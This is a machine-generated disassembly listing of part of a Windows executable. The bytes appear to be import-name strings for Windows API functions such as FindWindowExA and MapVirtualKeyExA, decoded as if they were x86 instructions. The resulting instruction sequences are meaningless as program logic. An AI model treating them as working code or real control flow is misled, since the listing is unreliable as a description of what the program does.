  413b3a:	ins    DWORD PTR es:[edi],dx
  413b3b:	dec    ecx
  413b3c:	outs   dx,BYTE PTR ds:[esi]
  413b3d:	outs   dx,WORD PTR ds:[esi]
  413b3f:	push   edi
  413b40:	add    BYTE PTR [eax],al
  413b42:	sub    BYTE PTR [ecx],al
  413b44:	inc    edi
  413b45:	gs je  0x413b94
  413b48:	popa   
  413b49:	jae    0x413bbf
  413b4b:	inc    ecx
  413b4c:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413b50:	gs push eax
  413b52:	outs   dx,DWORD PTR ds:[esi]
  413b53:	jo     0x413bca
  413b55:	jo     0x413b57
  413b57:	add    dl,ah
  413b59:	add    BYTE PTR [esi+0x69],al
  413b5c:	outs   dx,BYTE PTR ds:[esi]
  413b5d:	fs push edi
  413b5f:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [ebp+0x1],bh
  413b6a:	dec    eax
  413b6b:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x74657261
  413b73:	add    BYTE PTR [esi+0x1],ah
  413b76:	inc    edi
  413b77:	gs je  0x413bcf
  413b7a:	jae    0x413be1
  413b7c:	jb     0x413bcd
  413b7e:	bound  ebp,QWORD PTR [edx+0x65]
  413b81:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  413b85:	outs   dx,WORD PTR ds:[esi]
  413b87:	jb     0x413bf6
  413b89:	popa   
  413b8a:	je     0x413bf5
  413b8c:	outs   dx,DWORD PTR ds:[esi]
  413b8d:	outs   dx,BYTE PTR ds:[esi]
  413b8e:	push   edi
  413b8f:	add    ch,bl
  413b91:	add    BYTE PTR [ebp+0x71],al
  413b94:	jne    0x413bf7
  413b96:	ins    BYTE PTR es:[edi],dx
  413b97:	push   edx
  413b98:	arpl   WORD PTR gs:[eax+eax*1-0x6c],si
  413b9d:	add    dl,BYTE PTR [edx+esi*2+0x61]
  413ba1:	outs   dx,BYTE PTR ds:[esi]
  413ba2:	jae    0x413c10
  413ba4:	popa   
  413ba5:	je     0x413c0c
  413ba7:	inc    ecx
  413ba8:	arpl   WORD PTR [ebx+0x65],sp
  413bab:	ins    BYTE PTR es:[edi],dx
  413bac:	gs jb  0x413c10
  413baf:	je     0x413c20
  413bb1:	jb     0x413c0a
  413bb3:	add    BYTE PTR [esi],bh
  413bb5:	add    BYTE PTR [ebx+0x68],al
  413bb8:	imul   ebp,DWORD PTR [esp+eiz*2+0x57],0x6f646e69
  413bc0:	ja     0x413c08
  413bc2:	jb     0x413c33
  413bc4:	ins    DWORD PTR es:[edi],dx
  413bc5:	push   eax
  413bc6:	outs   dx,DWORD PTR ds:[esi]
  413bc7:	imul   ebp,DWORD PTR [esi+0x74],0x28a0000
  413bce:	push   esp
  413bcf:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  413bd7:	ja     0x413c4c
  413bd9:	add    BYTE PTR [esi+0x616f4c01],dh
  413bdf:	fs dec ebp
  413be1:	outs   dx,BYTE PTR gs:[esi]
  413be3:	jne    0x413c26
  413be5:	add    al,al
  413be7:	add    BYTE PTR [ebp+0x6e],al
  413bea:	popa   
  413beb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  413bef:	arpl   WORD PTR [edx+0x6f],si
  413bf2:	ins    BYTE PTR es:[edi],dx
  413bf3:	ins    BYTE PTR es:[edi],dx
  413bf4:	inc    edx
  413bf5:	popa   
  413bf6:	jb     0x413bf8
  413bf8:	xor    al,BYTE PTR [ecx]
  413bfa:	inc    edi
  413bfb:	gs je  0x413c4b
  413bfe:	outs   dx,BYTE PTR gs:[esi]
  413c00:	jne    0x413c4b
  413c02:	je     0x413c69
  413c04:	ins    DWORD PTR es:[edi],dx
  413c05:	inc    ebx
  413c06:	outs   dx,DWORD PTR ds:[esi]
  413c07:	jne    0x413c77
  413c09:	je     0x413c0b
  413c0b:	add    cl,ah
  413c0d:	add    BYTE PTR [esi+0x69],al
  413c10:	outs   dx,BYTE PTR ds:[esi]
  413c11:	fs push edi
  413c13:	imul   ebp,DWORD PTR [esi+0x64],0x41776f
  413c1a:	rol    BYTE PTR [ecx],1
  413c1c:	dec    ebp
  413c1d:	gs jae 0x413c93
  413c20:	popa   
  413c21:	addr16 gs inc edx
  413c24:	outs   dx,DWORD PTR ds:[esi]
  413c25:	js     0x413c6c
  413c27:	js     0x413c80
  413c29:	add    BYTE PTR [eax+0x536e4901],al
  413c2f:	outs   dx,BYTE PTR gs:[esi]
  413c31:	fs dec ebp
  413c33:	gs jae 0x413ca9
  413c36:	popa   
  413c37:	addr16 gs add al,bl
  413c3b:	add    DWORD PTR [ebp+0x6f],ecx
  413c3e:	outs   dx,BYTE PTR ds:[esi]
  413c3f:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  413c47:	push   eax
  413c48:	outs   dx,DWORD PTR ds:[esi]
  413c49:	imul   ebp,DWORD PTR [esi+0x74],0x1680000
  413c50:	inc    edi
  413c51:	gs je  0x413cab
  413c54:	imul   ebp,DWORD PTR [esi+0x64],0x7d00776f
  413c5b:	add    dl,BYTE PTR [ebx+0x68]
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	ja     0x413cb4
  413c61:	arpl   WORD PTR [edx+0x6f],si
  413c64:	ins    BYTE PTR es:[edi],dx
  413c65:	ins    BYTE PTR es:[edi],dx
  413c66:	inc    edx
  413c67:	popa   
  413c68:	jb     0x413c6a
  413c6a:	mov    cl,0x1
  413c6c:	dec    esp
  413c6d:	outs   dx,DWORD PTR ds:[esi]
  413c6e:	popa   
  413c6f:	fs dec ecx
  413c71:	ins    DWORD PTR es:[edi],dx
  413c72:	popa   
  413c73:	addr16 gs inc ecx
  413c76:	add    BYTE PTR [eax],al
  413c78:	cdq    
  413c79:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413c7d:	ins    BYTE PTR es:[edi],dx
  413c7e:	outs   dx,DWORD PTR ds:[esi]
  413c7f:	addr16 inc edx
  413c81:	outs   dx,DWORD PTR ds:[esi]
  413c82:	js     0x413ccd
  413c84:	outs   dx,BYTE PTR ds:[esi]
  413c85:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  413c8d:	jb     0x413cf0
  413c8f:	ins    DWORD PTR es:[edi],dx
  413c90:	inc    ecx
  413c91:	add    ch,al
  413c93:	add    DWORD PTR [ebp+0x61],ecx
  413c96:	jo     0x413cee
  413c98:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413c9f:	gs jns 0x413ce3
  413ca2:	add    BYTE PTR [eax],al
  413ca4:	sbb    BYTE PTR [edx],al
  413ca6:	push   edx
  413ca7:	gs ins DWORD PTR es:[edi],dx
  413ca9:	outs   dx,DWORD PTR ds:[esi]
  413caa:	jbe    0x413d11
  413cac:	push   eax
  413cad:	jb     0x413d1e
  413caf:	jo     0x413d08
  413cb1:	add    BYTE PTR [ecx+eax*1+0x47],ah
  413cb5:	gs je  0x413d0d
  413cb8:	jo     0x413d1e
  413cba:	popa   
  413cbb:	je     0x413d22
  413cbd:	push   edx
  413cbe:	outs   dx,BYTE PTR ds:[si]
  413cc0:	add    BYTE PTR [eax],al
  413cc2:	add    al,BYTE PTR [edx]
  413cc4:	push   edx
  413cc5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  413cce:	popa   
  413ccf:	jae    0x413d44
  413cd1:	inc    ecx
  413cd2:	add    BYTE PTR [eax],al
  413cd4:	add    dl,BYTE PTR ds:[ebx+0x65]
  413cd8:	je     0x413d1e
  413cda:	ins    BYTE PTR es:[edi],dx
  413cdb:	addr16 dec ecx
  413cdd:	je     0x413d44
  413cdf:	ins    DWORD PTR es:[edi],dx
  413ce0:	push   esp
  413ce1:	gs js  0x413d58
  413ce4:	inc    ecx
  413ce5:	add    BYTE PTR [ebp+0x61724400],dh
  413ceb:	ja     0x413d3a
  413ced:	outs   dx,BYTE PTR gs:[esi]
  413cef:	jne    0x413d33
  413cf1:	popa   
  413cf2:	jb     0x413cf4
  413cf4:	sub    eax,DWORD PTR [ecx]
  413cf6:	inc    edi
  413cf7:	gs je  0x413d47
  413cfa:	outs   dx,BYTE PTR gs:[esi]
  413cfc:	jne    0x413cfe
  413cfe:	repnz add DWORD PTR [eax+0x6f],edx
  413d02:	jae    0x413d78
  413d04:	dec    ebp
  413d05:	gs jae 0x413d7b
  413d08:	popa   
  413d09:	addr16 gs push edi
  413d0c:	add    BYTE PTR [eax],al
  413d0e:	push   cs
  413d0f:	add    DWORD PTR [edi+0x65],eax
  413d12:	je     0x413d58
  413d14:	ins    BYTE PTR es:[edi],dx
  413d15:	addr16 inc ebx
  413d17:	je     0x413d8b
  413d19:	ins    BYTE PTR es:[edi],dx
  413d1a:	dec    ecx
  413d1b:	inc    esp
  413d1c:	add    BYTE PTR [eax],al
  413d1e:	mov    cl,0x2
  413d20:	push   esi
  413d21:	imul   ecx,DWORD PTR [ebx+0x65],0x79
  413d25:	push   ebx
  413d26:	arpl   WORD PTR [ecx+0x6e],sp
  413d29:	push   edi
  413d2a:	add    BYTE PTR [eax],al
  413d2c:	sbb    BYTE PTR [ecx],al
  413d2e:	inc    edi
  413d2f:	gs je  0x413d7b
  413d32:	arpl   WORD PTR [edi+0x6e],bp
  413d35:	dec    ecx
  413d36:	outs   dx,BYTE PTR ds:[esi]
  413d37:	outs   dx,WORD PTR ds:[esi]
  413d39:	add    cl,cl
  413d3b:	add    DWORD PTR [ebp+0x61],ecx
  413d3e:	jo     0x413d97
  413d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413d47:	imul   ebp,DWORD PTR [esi+0x74],0x2d0073
  413d4e:	inc    ebx
  413d4f:	push   0x654e7261
  413d54:	js     0x413dca
  413d56:	push   edi
  413d57:	add    BYTE PTR [ecx],ch
  413d59:	add    dl,BYTE PTR [ebx+0x65]
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	fs dec ebp
  413d5f:	gs jae 0x413dd5
  413d62:	popa   
  413d63:	addr16 gs push esp
  413d66:	imul   ebp,DWORD PTR [ebp+0x65],0x4174756f
  413d6d:	add    BYTE PTR [eax],ch
  413d6f:	add    BYTE PTR [ebx+0x68],al
  413d72:	popa   
  413d73:	jb     0x413dc1
  413d75:	outs   dx,DWORD PTR ds:[esi]
  413d76:	ja     0x413ddd
  413d78:	jb     0x413dbc
  413d7a:	jne    0x413de2
  413d7c:	push   di
  413d7e:	add    BYTE PTR [eax],al
  413d80:	ins    DWORD PTR es:[edi],dx
  413d81:	add    DWORD PTR [edi+0x65],eax
  413d84:	je     0x413ddd
  413d86:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  413d8d:	outs   dx,BYTE PTR ds:[esi]
  413d8e:	addr16 push edi
  413d90:	add    BYTE PTR [eax],al
  413d92:	mov    bh,0x2
  413d94:	push   edi
  413d95:	popa   
  413d96:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  413d9e:	jne    0x413e14
  413da0:	dec    ecx
  413da1:	fs ins BYTE PTR es:[edi],dx
  413da3:	add    BYTE PTR gs:[eax],al
  413da6:	mov    DWORD PTR [ecx],0x5670614d
  413dac:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413db3:	gs jns 0x413dfb
  413db6:	js     0x413e0f
  413db8:	add    BYTE PTR [eax],al
  413dba:	cmp    eax,0x65684300
  413dbf:	arpl   WORD PTR [ebx+0x52],bp
  413dc2:	popa   
  413dc3:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413dcb:	outs   dx,BYTE PTR ds:[esi]
  413dcc:	add    BYTE PTR [eax],al
  413dce:	add    eax,0x6c6c4100
  413dd3:	outs   dx,DWORD PTR ds:[esi]
  413dd4:	ja     0x413e29
  413dd6:	gs je  0x413e1f
  413dd9:	outs   dx,DWORD PTR ds:[esi]
  413dda:	jb     0x413e41
  413ddc:	addr16 jb 0x413e4e
  413ddf:	jne    0x413e4f
  413de1:	fs push edi
  413de3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413dea:	into   
  413deb:	add    DWORD PTR [ebp+0x65],ecx
  413dee:	jae    0x413e63
  413df0:	popa   
  413df1:	addr16 gs inc edx
  413df4:	outs   dx,DWORD PTR ds:[esi]
  413df5:	js     0x413e38
  413df7:	add    BYTE PTR [edx],bh
  413df9:	add    DWORD PTR [edi+0x65],eax
  413dfc:	je     0x413e4b
  413dfe:	gs jae 0x413e74
  413e01:	popa   
  413e02:	addr16 gs inc ecx
  413e05:	add    BYTE PTR [edx+0x2],cl
  413e08:	push   ebx
  413e09:	gs je  0x413e59
  413e0c:	outs   dx,BYTE PTR gs:[esi]
  413e0e:	jne    0x413e54
  413e10:	gs popaw 
  413e13:	jne    0x413e81
  413e15:	je     0x413e60
  413e17:	je     0x413e7e
  413e19:	ins    DWORD PTR es:[edi],dx
  413e1a:	add    BYTE PTR [eax],al
  413e1c:	aad    0x1
  413e1e:	dec    ebp
  413e1f:	gs jae 0x413e95
  413e22:	popa   
  413e23:	addr16 gs inc edx
  413e26:	outs   dx,DWORD PTR ds:[esi]
  413e27:	js     0x413e80
  413e29:	add    BYTE PTR [ecx],bh
  413e2b:	add    DWORD PTR [edi+0x65],eax
  413e2e:	je     0x413e7d
  413e30:	outs   dx,BYTE PTR gs:[esi]
  413e32:	jne    0x413e87
  413e34:	je     0x413ea8
  413e36:	imul   ebp,DWORD PTR [esi+0x67],0xb9000057
  413e3d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413e41:	fs dec ebp
  413e43:	outs   dx,BYTE PTR gs:[esi]
  413e45:	jne    0x413e9e
  413e47:	add    BYTE PTR [ecx+eax*1+0x47],bl
  413e4b:	gs je  0x413ea1
  413e4e:	jns    0x413ec3
  413e50:	je     0x413eb7
  413e52:	ins    DWORD PTR es:[edi],dx
  413e53:	dec    ebp
  413e54:	gs je  0x413ec9
  413e57:	imul   esp,DWORD PTR [ebx+0x73],0x2260000
  413e5e:	push   ebx
  413e5f:	outs   dx,BYTE PTR gs:[esi]
  413e61:	fs dec ebp
  413e63:	gs jae 0x413ed9
  413e66:	popa   
  413e67:	addr16 gs inc ecx
  413e6a:	add    BYTE PTR [eax],al
  413e6c:	aaa    
  413e6d:	add    DWORD PTR [edi+0x65],eax
  413e70:	je     0x413ebf
  413e72:	outs   dx,BYTE PTR gs:[esi]
  413e74:	jne    0x413ec9
  413e76:	je     0x413ed9
  413e78:	je     0x413edf
  413e7a:	add    BYTE PTR [eax],al
  413e7c:	mov    bl,0x0
  413e7e:	inc    esp
  413e7f:	jb     0x413ee2
  413e81:	ja     0x413ecc
  413e83:	arpl   WORD PTR [edi+0x6e],bp
  413e86:	add    BYTE PTR [eax],al
  413e88:	xchg   ebp,eax
  413e89:	add    BYTE PTR [ebp+eiz*2+0x73],al
  413e8d:	je     0x413f01
  413e8f:	outs   dx,DWORD PTR ds:[esi]
  413e90:	jns    0x413ed5
  413e92:	jne    0x413f06
  413e94:	jae    0x413f05
  413e96:	jb     0x413e98
  413e98:	add    al,BYTE PTR [eax]
  413e9a:	inc    ecx
  413e9b:	fs push 0x75
  413e9e:	jae    0x413f14
  413ea0:	push   edi
  413ea1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413ea8:	arpl   WORD PTR [eax+eax*1+0x0],si
  413eac:	pop    ecx
  413ead:	add    DWORD PTR [edi+0x65],eax
  413eb0:	je     0x413f05
  413eb2:	jns    0x413f27
  413eb4:	inc    ebx
  413eb5:	outs   dx,DWORD PTR ds:[esi]
  413eb6:	ins    BYTE PTR es:[edi],dx
  413eb7:	outs   dx,DWORD PTR ds:[esi]
  413eb8:	jb     0x413eba
  413eba:	jle    0x413ebd
  413ebc:	dec    eax
  413ebd:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  413ec5:	jne    0x413f10
  413ec7:	je     0x413f2e
  413ec9:	ins    DWORD PTR es:[edi],dx
  413eca:	add    BYTE PTR [eax],al
  413ecc:	or     DWORD PTR [eax],eax
  413ece:	inc    ecx
  413ecf:	jo     0x413f41
  413ed1:	outs   dx,BYTE PTR gs:[esi]
  413ed3:	fs dec ebp
  413ed5:	outs   dx,BYTE PTR gs:[esi]
  413ed7:	jne    0x413f30
  413ed9:	add    BYTE PTR [eax+eax*1],bh
  413edc:	inc    ebx
  413edd:	push   0x4d6b6365
  413ee2:	outs   dx,BYTE PTR gs:[esi]
  413ee4:	jne    0x413f38
  413ee6:	popa   
  413ee7:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  413eef:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  413ef6:	push   ebx
  413ef7:	je     0x413f6b
  413ef9:	imul   ebp,DWORD PTR [esi+0x67],0x21f0057
  413f00:	push   ebx
  413f01:	arpl   WORD PTR [edx+0x6f],si
  413f04:	ins    BYTE PTR es:[edi],dx
  413f05:	ins    BYTE PTR es:[edi],dx
  413f06:	push   edi
  413f07:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f0e:	xor    DWORD PTR [eax],eax
  413f10:	inc    ebx
  413f11:	push   0x72507261
  413f16:	gs jbe 0x413f70
  413f19:	add    BYTE PTR [edi+0x2],bl
  413f1c:	push   ebx
  413f1d:	gs je  0x413f73
  413f20:	jns    0x413f95
  413f22:	inc    ebx
  413f23:	outs   dx,DWORD PTR ds:[esi]
  413f24:	ins    BYTE PTR es:[edi],dx
  413f25:	outs   dx,DWORD PTR ds:[esi]
  413f26:	jb     0x413f9b
  413f28:	add    BYTE PTR [eax],al
  413f2a:	sgdtd  [edi+0x65]
  413f2e:	je     0x413f74
  413f30:	ins    BYTE PTR es:[edi],dx
  413f31:	addr16 dec ecx
  413f33:	je     0x413f9a
  413f35:	ins    DWORD PTR es:[edi],dx
  413f36:	add    BYTE PTR [eax],al
  413f38:	dec    esp
  413f39:	add    dl,BYTE PTR [ebx+0x65]
  413f3c:	je     0x413f8b
  413f3e:	outs   dx,BYTE PTR gs:[esi]
  413f40:	jne    0x413f8b
  413f42:	je     0x413fa9
  413f44:	ins    DWORD PTR es:[edi],dx
  413f45:	inc    edx
  413f46:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x7370
  413f4e:	or     al,0x1
  413f50:	inc    edi
  413f51:	gs je  0x413f98
  413f54:	gs jae 0x413fc2
  413f57:	je     0x413fc8
  413f59:	jo     0x413fb2
  413f5b:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f62:	inc    ebp
  413f63:	add    DWORD PTR [edi+0x65],eax
  413f66:	je     0x413fb8
  413f68:	popa   
  413f69:	jb     0x413fd0
  413f6b:	outs   dx,BYTE PTR ds:[esi]
  413f6c:	je     0x413f6e
  413f6e:	mov    BYTE PTR [eax],0x45
  413f71:	outs   dx,BYTE PTR ds:[esi]
  413f72:	fs push esp
  413f74:	popa   
  413f75:	jae    0x413fe2
  413f77:	add    BYTE PTR [eax+0x0],ah
  413f7a:	inc    ebx
  413f7b:	jb     0x413fe2
  413f7d:	popa   
  413f7e:	je     0x413fe5
  413f80:	dec    ebp
  413f81:	outs   dx,BYTE PTR gs:[esi]
  413f83:	jne    0x413f85
  413f85:	add    bl,dh
  413f87:	add    BYTE PTR [edi+0x65],al
  413f8a:	je     0x413fcf
  413f8c:	popa   
  413f8d:	jb     0x413ff4
  413f8f:	je     0x413fe1
  413f91:	outs   dx,DWORD PTR ds:[esi]
  413f92:	jae    0x413f94
  413f94:	sub    eax,DWORD PTR [edx]
  413f96:	push   ebx
  413f97:	outs   dx,BYTE PTR gs:[esi]
  413f99:	fs dec ebp
  413f9b:	gs jae 0x414011
  413f9e:	popa   
  413f9f:	addr16 gs push edi
  413fa2:	add    BYTE PTR [eax],al
  413fa4:	test   DWORD PTR [ecx],eax
  413fa6:	dec    ecx
  413fa7:	outs   dx,BYTE PTR ds:[esi]
  413fa8:	jae    0x41400f
  413faa:	jb     0x414020
  413fac:	dec    ebp
  413fad:	outs   dx,BYTE PTR gs:[esi]
  413faf:	jne    0x413ffa
  413fb1:	je     0x414018
  413fb3:	ins    DWORD PTR es:[edi],dx
  413fb4:	push   edi
  413fb5:	add    BYTE PTR [ecx+0x0],ah
  413fb8:	inc    ebx
  413fb9:	jb     0x414020
  413fbb:	popa   
  413fbc:	je     0x414023
  413fbe:	push   eax
  413fbf:	outs   dx,DWORD PTR ds:[esi]
  413fc0:	jo     0x414037
  413fc2:	jo     0x414011
  413fc4:	outs   dx,BYTE PTR gs:[esi]
  413fc6:	jne    0x413fc8
  413fc8:	inc    eax
  413fc9:	add    DWORD PTR [edi+0x65],eax
  413fcc:	je     0x41401b
  413fce:	outs   dx,DWORD PTR ds:[esi]
  413fcf:	outs   dx,BYTE PTR ds:[esi]
  413fd0:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6f666e49
  413fd8:	push   edi
  413fd9:	add    al,cl
  413fdb:	add    DWORD PTR [ebp+0x61],ecx
  413fde:	jo     0x414036
  413fe0:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413fe7:	gs jns 0x414041
  413fea:	add    BYTE PTR [eax],al
  413fec:	out    0x0,eax
  413fee:	inc    esi
  413fef:	jb     0x414052
  413ff1:	ins    DWORD PTR es:[edi],dx
  413ff2:	gs push edx
  413ff4:	arpl   WORD PTR gs:[eax+eax*1-0x41],si
  413ff9:	add    BYTE PTR [ebp+0x6e],al
  413ffc:	popa   
  413ffd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x4d]
  414001:	outs   dx,BYTE PTR gs:[esi]
  414003:	jne    0x41404e
  414005:	je     0x41406c
  414007:	ins    DWORD PTR es:[edi],dx
  414008:	add    BYTE PTR [eax],al
  41400a:	fwait
  41400b:	add    dl,BYTE PTR [ebp+0x6e]
  41400e:	ins    BYTE PTR es:[edi],dx
  41400f:	outs   dx,DWORD PTR ds:[esi]
  414010:	popa   
  414011:	fs dec ebx
  414013:	gs jns 0x414078
  414016:	outs   dx,DWORD PTR ds:[esi]
  414017:	popa   
  414018:	jb     0x41407e
  41401a:	dec    esp
  41401b:	popa   
  41401c:	jns    0x41408d
  41401e:	jne    0x414094
  414020:	add    BYTE PTR [eax],al
  414022:	mov    esp,0x6e695702
  414027:	outs   dx,DWORD PTR fs:[esi]
  414029:	ja     0x414071
  41402b:	jb     0x41409c
  41402d:	ins    DWORD PTR es:[edi],dx
  41402e:	push   eax
  41402f:	outs   dx,DWORD PTR ds:[esi]
  414030:	imul   ebp,DWORD PTR [esi+0x74],0x4400ab00
  414037:	jb     0x41409a
  414039:	ja     0x41407c
  41403b:	outs   dx,BYTE PTR ds:[esi]
  41403c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  414043:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  414048:	and    BYTE PTR [edx],al
  41404a:	push   ebx
  41404b:	arpl   WORD PTR [edx+0x6f],si
  41404e:	ins    BYTE PTR es:[edi],dx
  41404f:	ins    BYTE PTR es:[edi],dx
  414050:	push   edi
  414051:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  414058:	add    BYTE PTR [eax],al
  41405a:	pop    eax
  41405b:	add    dl,BYTE PTR [ebx+0x65]
  41405e:	je     0x4140b2
  414060:	arpl   WORD PTR gs:[eax+eax*1+0x3d],si
  414065:	add    dl,BYTE PTR [ebx+0x65]
  414068:	je     0x4140ae
  41406a:	ins    BYTE PTR es:[edi],dx
  41406b:	addr16 dec ecx
  41406d:	je     0x4140d4
  41406f:	ins    DWORD PTR es:[edi],dx
  414070:	dec    ecx
  414071:	outs   dx,BYTE PTR ds:[esi]
  414072:	je     0x414074
  414074:	or     eax,0x67654200
  414079:	imul   ebp,DWORD PTR [esi+0x50],0x746e6961
  414080:	add    BYTE PTR [eax],al
  414082:	pop    ebp
  414083:	add    BYTE PTR [ebx+0x72],al
  414086:	gs popa 
  414088:	je     0x4140ef
  41408a:	dec    ecx
  41408b:	arpl   WORD PTR [edi+0x6e],bp
  41408e:	dec    ecx
  41408f:	outs   dx,BYTE PTR ds:[esi]
  414090:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  414098:	dec    esi
  414099:	add    dl,BYTE PTR [ebx+0x65]
  41409c:	je     0x4140eb
  41409e:	outs   dx,BYTE PTR gs:[esi]
  4140a0:	jne    0x4140eb
  4140a2:	je     0x414109
  4140a4:	ins    DWORD PTR es:[edi],dx
  4140a5:	dec    ecx
  4140a6:	outs   dx,BYTE PTR ds:[esi]
  4140a7:	outs   dx,WORD PTR ds:[esi]
  4140a9:	push   edi
  4140aa:	add    BYTE PTR [eax],al
  4140ac:	pop    edx
  4140ad:	add    dl,BYTE PTR [ebx+0x65]
  4140b0:	je     0x414105
  4140b2:	arpl   WORD PTR [edx+0x6f],si
  4140b5:	ins    BYTE PTR es:[edi],dx
  4140b6:	ins    BYTE PTR es:[edi],dx
  4140b7:	dec    ecx
  4140b8:	outs   dx,BYTE PTR ds:[esi]
  4140b9:	outs   dx,WORD PTR ds:[esi]
  4140bb:	add    BYTE PTR [edx],dh
  4140bd:	add    BYTE PTR [ebx+0x68],al
  4140c0:	popa   
  4140c1:	jb     0x414117
  4140c3:	outs   dx,DWORD PTR ds:[esi]
  4140c4:	dec    edi
  4140c5:	gs ins DWORD PTR es:[edi],dx
  4140c7:	inc    ecx
  4140c8:	add    BYTE PTR [eax],al
  4140ca:	sub    eax,0x6e655302
  4140cf:	fs dec esi
  4140d1:	outs   dx,DWORD PTR ds:[esi]
  4140d2:	je     0x41413d
  4140d4:	data16 jns 0x414124
  4140d7:	gs jae 0x41414d
  4140da:	popa   
  4140db:	addr16 gs push edi
  4140de:	add    BYTE PTR [eax],al
  4140e0:	sti    
  4140e1:	add    BYTE PTR [edi+0x65],al
  4140e4:	je     0x414129
  4140e6:	ins    BYTE PTR es:[edi],dx
  4140e7:	popa   
  4140e8:	jae    0x41415d
  4140ea:	dec    esi
  4140eb:	popa   
  4140ec:	ins    DWORD PTR es:[edi],dx
  4140ed:	gs push edi
  4140ef:	add    BYTE PTR [ebx+0x61725402],dl
  4140f5:	outs   dx,BYTE PTR ds:[esi]
  4140f6:	jae    0x414164
  4140f8:	popa   
  4140f9:	je     0x414160
  4140fb:	inc    ecx
  4140fc:	arpl   WORD PTR [ebx+0x65],sp
  4140ff:	ins    BYTE PTR es:[edi],dx
  414100:	gs jb  0x414164
  414103:	je     0x414174
  414105:	jb     0x414148
  414107:	add    BYTE PTR [ebx+0x2],bh
  41410a:	push   ebx
  41410b:	push   0x7543776f
  414110:	jb     0x414185
  414112:	outs   dx,DWORD PTR ds:[esi]
  414113:	jb     0x414115
  414115:	add    BYTE PTR [ebx+0x2],dh
  414118:	push   ebx
  414119:	gs je  0x414173
  41411c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  414123:	js     0x414199
  414125:	inc    ecx
  414126:	add    BYTE PTR [eax],al
  414128:	add    BYTE PTR es:[ebx+0x68],al
  41412c:	popa   
  41412d:	jb     0x41417b
  41412f:	outs   dx,DWORD PTR ds:[esi]
  414130:	ja     0x414197
  414132:	jb     0x414175
  414134:	add    BYTE PTR [eax],al
  414136:	xchg   BYTE PTR [ecx],al
  414138:	dec    ecx
  414139:	outs   dx,BYTE PTR ds:[esi]
  41413a:	jae    0x4141a1
  41413c:	jb     0x4141b2
  41413e:	dec    ebp
  41413f:	outs   dx,BYTE PTR gs:[esi]
  414141:	jne    0x41419a
  414143:	add    BYTE PTR [eax],cl
  414145:	add    BYTE PTR [ecx+0x70],al
  414148:	jo     0x4141af
  41414a:	outs   dx,BYTE PTR ds:[esi]
  41414b:	fs dec ebp
  41414d:	outs   dx,BYTE PTR gs:[esi]
  41414f:	jne    0x414192
  414151:	add    BYTE PTR [edx+0x1],ch
  414154:	inc    edi
  414155:	gs je  0x4141af
  414158:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41415f:	add    BYTE PTR [ecx+0x2],bl
  414162:	push   ebx
  414163:	gs je  0x4141b8
  414166:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  41416b:	jo     0x4141e1
  41416d:	jns    0x41416f
  41416f:	add    BYTE PTR [edx+0x1],bl
  414172:	inc    edi
  414173:	gs je  0x4141c9
  414176:	jns    0x4141eb
  414178:	inc    ebx
  414179:	outs   dx,DWORD PTR ds:[esi]
  41417a:	ins    BYTE PTR es:[edi],dx
  41417b:	outs   dx,DWORD PTR ds:[esi]
  41417c:	jb     0x4141c0
  41417e:	jb     0x4141f5
  414180:	jae    0x4141ea
  414182:	add    BYTE PTR [eax],al
  414184:	jg     0x414188
  414186:	push   ebx
  414187:	push   0x6957776f
  41418c:	outs   dx,BYTE PTR ds:[esi]
  41418d:	outs   dx,DWORD PTR fs:[esi]
  41418f:	ja     0x414191
  414191:	add    BYTE PTR [eax+eax*1],ah
  414194:	inc    ebx
  414195:	push   0x65676e61
  41419a:	dec    ebp
  41419b:	outs   dx,BYTE PTR gs:[esi]
  41419d:	jne    0x4141f6
  41419f:	add    al,ah
  4141a1:	add    DWORD PTR [edi+0x65],ecx
  4141a4:	ins    DWORD PTR es:[edi],dx
  4141a5:	push   esp
  4141a6:	outs   dx,DWORD PTR ds:[esi]
  4141a7:	inc    ebx
  4141a8:	push   0x417261
  4141ad:	add    BYTE PTR [edi+0x43734901],cl
  4141b3:	push   0x6c417261
  4141b8:	jo     0x414222
  4141ba:	popa   
  4141bb:	push   edi
  4141bc:	add    BYTE PTR [eax],al
  4141be:	xchg   BYTE PTR [edx],al
  4141c0:	push   ebx
  4141c1:	jns    0x414236
  4141c3:	je     0x41422a
  4141c5:	ins    DWORD PTR es:[edi],dx
  4141c6:	push   eax
  4141c7:	popa   
  4141c8:	jb     0x41422b
